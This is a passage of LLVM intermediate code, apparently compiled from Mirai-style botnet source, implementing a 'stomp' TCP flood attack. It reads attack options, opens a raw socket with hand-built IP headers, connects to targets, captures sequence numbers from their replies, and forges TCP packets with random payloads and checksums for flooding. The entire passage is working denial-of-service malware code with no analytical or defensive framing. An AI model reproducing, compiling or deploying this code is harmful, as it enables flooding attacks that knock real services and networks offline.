  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #4
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %111, i32* %12, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %114

113:                                              ; preds = %5
  br label %629

114:                                              ; preds = %5
  store i32 1, i32* %11, align 4
  %115 = load i32, i32* %12, align 4
  %116 = bitcast i32* %11 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %122

119:                                              ; preds = %114
  %120 = load i32, i32* %12, align 4
  %121 = call i32 @close(i32 %120)
  br label %629

122:                                              ; preds = %114
  store i32 0, i32* %11, align 4
  br label %123

123:                                              ; preds = %504, %122
  %124 = load i32, i32* %11, align 4
  %125 = load i8, i8* %7, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp slt i32 %124, %126
  br i1 %127, label %128, label %507

128:                                              ; preds = %123
  store i32 0, i32* %29, align 4
  br label %129

129:                                              ; preds = %499, %488, %128
  %130 = call i32 @socket(i32 2, i32 1, i32 0) #4
  store i32 %130, i32* %29, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %133

132:                                              ; preds = %129
  br label %504

133:                                              ; preds = %129
  %134 = load i32, i32* %29, align 4
  %135 = load i32, i32* %29, align 4
  %136 = call i32 (i32, i32, ...) @fcntl(i32 %135, i32 3, i32 0)
  %137 = or i32 %136, 2048
  %138 = call i32 (i32, i32, ...) @fcntl(i32 %134, i32 4, i32 %137)
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %139, align 4
  %140 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = icmp slt i32 %146, 32
  br i1 %147, label %148, label %169

148:                                              ; preds = %133
  %149 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %150 = load i32, i32* %11, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @ntohl(i32 %154) #5
  %156 = call i32 @rand_next()
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 2
  %162 = load i8, i8* %161, align 4
  %163 = zext i8 %162 to i32
  %164 = lshr i32 %156, %163
  %165 = add i32 %155, %164
  %166 = call i32 @htonl(i32 %165) #5
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %168 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %167, i32 0, i32 0
  store i32 %166, i32* %168, align 4
  br label %178

169:                                              ; preds = %133
  %170 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %171 = load i32, i32* %11, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  store i32 %175, i32* %177, align 4
  br label %178

178:                                              ; preds = %169, %148
  %179 = load i16, i16* %19, align 2
  %180 = zext i16 %179 to i32
  %181 = icmp eq i32 %180, 65535
  br i1 %181, label %182, label %187

182:                                              ; preds = %178
  %183 = call i32 @rand_next()
  %184 = and i32 %183, 65535
  %185 = trunc i32 %184 to i16
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %185, i16* %186, align 2
  br label %191

187:                                              ; preds = %178
  %188 = load i16, i16* %19, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #5
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %189, i16* %190, align 2
  br label %191

191:                                              ; preds = %187, %182
  %192 = load i32, i32* %29, align 4
  %193 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %194 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %194, %struct.sockaddr** %193, align 8
  %195 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %196 = load %struct.sockaddr*, %struct.sockaddr** %195, align 8
  %197 = call i32 @connect(i32 %192, %struct.sockaddr* %196, i32 16)
  %198 = call i64 @time(i64* null) #4
  store i64 %198, i64* %34, align 8
  br label %199

199:                                              ; preds = %191, %502
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %200 = load i32, i32* %12, align 4
  %201 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i64 0, i64 0
  %202 = bitcast %union.__SOCKADDR_ARG* %37 to %struct.sockaddr**
  %203 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %203, %struct.sockaddr** %202, align 8
  %204 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %37, i32 0, i32 0
  %205 = load %struct.sockaddr*, %struct.sockaddr** %204, align 8
  %206 = call i64 @recvfrom(i32 %200, i8* %201, i64 256, i32 16384, %struct.sockaddr* %205, i32* %32)
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %36, align 4
  %208 = load i32, i32* %36, align 4
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %199
  br label %629

211:                                              ; preds = %199
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %213 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 4
  %218 = icmp eq i32 %214, %217
  br i1 %218, label %219, label %494

219:                                              ; preds = %211
  %220 = load i32, i32* %36, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  br i1 %222, label %223, label %494

223:                                              ; preds = %219
  %224 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i64 0, i64 0
  %225 = getelementptr inbounds i8, i8* %224, i64 20
  %226 = bitcast i8* %225 to %struct.tcphdr*
  store %struct.tcphdr* %226, %struct.tcphdr** %38, align 8
  %227 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = load i16, i16* %228, align 4
  %230 = zext i16 %229 to i32
  %231 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = icmp eq i32 %230, %233
  br i1 %234, label %235, label %493

235:                                              ; preds = %223
  %236 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 9
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %472

243:                                              ; preds = %235
  %244 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = lshr i16 %246, 12
  %248 = and i16 %247, 1
  %249 = zext i16 %248 to i32
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %472

251:                                              ; preds = %243
  %252 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %253 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 4
  %255 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %256 = load i32, i32* %11, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %258, i32 0, i32 0
  store i32 %254, i32* %259, align 4
  %260 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 2
  %262 = load i32, i32* %261, align 4
  %263 = call i32 @ntohl(i32 %262) #5
  %264 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %267, i32 0, i32 1
  store i32 %263, i32* %268, align 4
  %269 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 3
  %271 = load i32, i32* %270, align 4
  %272 = call i32 @ntohl(i32 %271) #5
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %274 = load i32, i32* %11, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 2
  store i32 %272, i32* %277, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 1
  %280 = load i16, i16* %279, align 2
  %281 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %282 = load i32, i32* %11, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i32 0, i32 3
  store i16 %280, i16* %285, align 4
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %287 = load i16, i16* %286, align 2
  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %289 = load i32, i32* %11, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 4
  store i16 %287, i16* %292, align 2
  %293 = load i32, i32* %26, align 4
  %294 = sext i32 %293 to i64
  %295 = add i64 40, %294
  %296 = call noalias align 16 i8* @malloc(i64 %295) #4
  %297 = load i8**, i8*** %14, align 8
  %298 = load i32, i32* %11, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i8*, i8** %297, i64 %299
  store i8* %296, i8** %300, align 8
  %301 = load i8**, i8*** %14, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = bitcast i8* %305 to %struct.iphdr*
  store %struct.iphdr* %306, %struct.iphdr** %39, align 8
  %307 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i64 1
  %309 = bitcast %struct.iphdr* %308 to %struct.tcphdr*
  store %struct.tcphdr* %309, %struct.tcphdr** %40, align 8
  %310 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i64 1
  %312 = bitcast %struct.tcphdr* %311 to i8*
  store i8* %312, i8** %41, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %314 = bitcast %struct.iphdr* %313 to i8*
  %315 = load i8, i8* %314, align 4
  %316 = and i8 %315, 15
  %317 = or i8 %316, 64
  store i8 %317, i8* %314, align 4
  %318 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %319 = bitcast %struct.iphdr* %318 to i8*
  %320 = load i8, i8* %319, align 4
  %321 = and i8 %320, -16
  %322 = or i8 %321, 5
  store i8 %322, i8* %319, align 4
  %323 = load i8, i8* %15, align 1
  %324 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 1
  store i8 %323, i8* %325, align 1
  %326 = load i32, i32* %26, align 4
  %327 = sext i32 %326 to i64
  %328 = add i64 40, %327
  %329 = trunc i64 %328 to i16
  %330 = call zeroext i16 @htons(i16 zeroext %329) #5
  %331 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 2
  store i16 %330, i16* %332, align 2
  %333 = load i16, i16* %16, align 2
  %334 = call zeroext i16 @htons(i16 zeroext %333) #5
  %335 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 3
  store i16 %334, i16* %336, align 4
  %337 = load i8, i8* %17, align 1
  %338 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 5
  store i8 %337, i8* %339, align 4
  %340 = load i8, i8* %18, align 1
  %341 = icmp ne i8 %340, 0
  br i1 %341, label %342, label %346

342:                                              ; preds = %251
  %343 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %344 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 4
  store i16 %343, i16* %345, align 2
  br label %346

346:                                              ; preds = %342, %251
  %347 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 6
  store i8 6, i8* %348, align 1
  %349 = load i32, i32* @LOCAL_ADDR, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 8
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 4
  %358 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 9
  store i32 %357, i32* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %361 = load i32, i32* %11, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 3
  %365 = load i16, i16* %364, align 4
  %366 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  store i16 %365, i16* %367, align 4
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 4
  %373 = load i16, i16* %372, align 2
  %374 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 1
  store i16 %373, i16* %375, align 2
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %377 = load i32, i32* %11, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 2
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 2
  store i32 %381, i32* %383, align 4
  %384 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %385 = load i32, i32* %11, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %387, i32 0, i32 1
  %389 = load i32, i32* %388, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 3
  store i32 %389, i32* %391, align 4
  %392 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 4
  %394 = load i16, i16* %393, align 4
  %395 = and i16 %394, -241
  %396 = or i16 %395, 128
  store i16 %396, i16* %393, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -257
  %401 = or i16 %400, 256
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -4097
  %406 = or i16 %405, 4096
  store i16 %406, i16* %403, align 4
  %407 = call i32 @rand_next()
  %408 = and i32 %407, 65535
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 5
  store i16 %409, i16* %411, align 2
  %412 = load i8, i8* %20, align 1
  %413 = sext i8 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 4
  %416 = load i16, i16* %415, align 4
  %417 = and i16 %413, 1
  %418 = shl i16 %417, 13
  %419 = and i16 %416, -8193
  %420 = or i16 %419, %418
  store i16 %420, i16* %415, align 4
  %421 = load i8, i8* %21, align 1
  %422 = sext i8 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 4
  %425 = load i16, i16* %424, align 4
  %426 = and i16 %422, 1
  %427 = shl i16 %426, 12
  %428 = and i16 %425, -4097
  %429 = or i16 %428, %427
  store i16 %429, i16* %424, align 4
  %430 = load i8, i8* %22, align 1
  %431 = sext i8 %430 to i16
  %432 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = and i16 %431, 1
  %436 = shl i16 %435, 11
  %437 = and i16 %434, -2049
  %438 = or i16 %437, %436
  store i16 %438, i16* %433, align 4
  %439 = load i8, i8* %23, align 1
  %440 = sext i8 %439 to i16
  %441 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = and i16 %440, 1
  %445 = shl i16 %444, 10
  %446 = and i16 %443, -1025
  %447 = or i16 %446, %445
  store i16 %447, i16* %442, align 4
  %448 = load i8, i8* %24, align 1
  %449 = sext i8 %448 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 4
  %452 = load i16, i16* %451, align 4
  %453 = and i16 %449, 1
  %454 = shl i16 %453, 9
  %455 = and i16 %452, -513
  %456 = or i16 %455, %454
  store i16 %456, i16* %451, align 4
  %457 = load i8, i8* %25, align 1
  %458 = sext i8 %457 to i16
  %459 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 4
  %461 = load i16, i16* %460, align 4
  %462 = and i16 %458, 1
  %463 = shl i16 %462, 8
  %464 = and i16 %461, -257
  %465 = or i16 %464, %463
  store i16 %465, i16* %460, align 4
  %466 = load i8*, i8** %41, align 8
  %467 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %466, i32 %467)
  %468 = load i8*, i8** %41, align 8
  %469 = load i32, i32* %26, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds i8, i8* %468, i64 %470
  store i8 0, i8* %471, align 1
  br label %503

472:                                              ; preds = %243, %235
  %473 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 4
  %475 = load i16, i16* %474, align 4
  %476 = lshr i16 %475, 8
  %477 = and i16 %476, 1
  %478 = zext i16 %477 to i32
  %479 = icmp ne i32 %478, 0
  br i1 %479, label %488, label %480

480:                                              ; preds = %472
  %481 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 4
  %483 = load i16, i16* %482, align 4
  %484 = lshr i16 %483, 10
  %485 = and i16 %484, 1
  %486 = zext i16 %485 to i32
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %488, label %491

488:                                              ; preds = %480, %472
  %489 = load i32, i32* %29, align 4
  %490 = call i32 @close(i32 %489)
  br label %129

491:                                              ; preds = %480
  br label %492

492:                                              ; preds = %491
  br label %493

493:                                              ; preds = %492, %223
  br label %494

494:                                              ; preds = %493, %219, %211
  %495 = call i64 @time(i64* null) #4
  %496 = load i64, i64* %34, align 8
  %497 = sub nsw i64 %495, %496
  %498 = icmp sgt i64 %497, 10
  br i1 %498, label %499, label %502

499:                                              ; preds = %494
  %500 = load i32, i32* %29, align 4
  %501 = call i32 @close(i32 %500)
  br label %129

502:                                              ; preds = %494
  br label %199

503:                                              ; preds = %346
  br label %504

504:                                              ; preds = %503, %132
  %505 = load i32, i32* %11, align 4
  %506 = add nsw i32 %505, 1
  store i32 %506, i32* %11, align 4
  br label %123, !llvm.loop !11

507:                                              ; preds = %123
  br label %508

508:                                              ; preds = %507, %628
  store i32 0, i32* %11, align 4
  br label %509

509:                                              ; preds = %619, %508
  %510 = load i32, i32* %11, align 4
  %511 = load i8, i8* %7, align 1
  %512 = zext i8 %511 to i32
  %513 = icmp slt i32 %510, %512
  br i1 %513, label %514, label %622

514:                                              ; preds = %509
  %515 = load i8**, i8*** %14, align 8
  %516 = load i32, i32* %11, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds i8*, i8** %515, i64 %517
  %519 = load i8*, i8** %518, align 8
  store i8* %519, i8** %42, align 8
  %520 = load i8*, i8** %42, align 8
  %521 = bitcast i8* %520 to %struct.iphdr*
  store %struct.iphdr* %521, %struct.iphdr** %43, align 8
  %522 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %523 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %522, i64 1
  %524 = bitcast %struct.iphdr* %523 to %struct.tcphdr*
  store %struct.tcphdr* %524, %struct.tcphdr** %44, align 8
  %525 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i64 1
  %527 = bitcast %struct.tcphdr* %526 to i8*
  store i8* %527, i8** %45, align 8
  %528 = load i16, i16* %16, align 2
  %529 = zext i16 %528 to i32
  %530 = icmp eq i32 %529, 65535
  br i1 %530, label %531, label %537

531:                                              ; preds = %514
  %532 = call i32 @rand_next()
  %533 = and i32 %532, 65535
  %534 = trunc i32 %533 to i16
  %535 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 3
  store i16 %534, i16* %536, align 4
  br label %537

537:                                              ; preds = %531, %514
  %538 = load i8, i8* %27, align 1
  %539 = icmp ne i8 %538, 0
  br i1 %539, label %540, label %547

540:                                              ; preds = %537
  %541 = load i8*, i8** %45, align 8
  %542 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %541, i32 %542)
  %543 = load i8*, i8** %45, align 8
  %544 = load i32, i32* %26, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds i8, i8* %543, i64 %545
  store i8 0, i8* %546, align 1
  br label %547

547:                                              ; preds = %540, %537
  %548 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %556 = load i32, i32* %11, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i32 0, i32 1
  %560 = load i32, i32* %559, align 4
  %561 = add i32 %560, 1
  store i32 %561, i32* %559, align 4
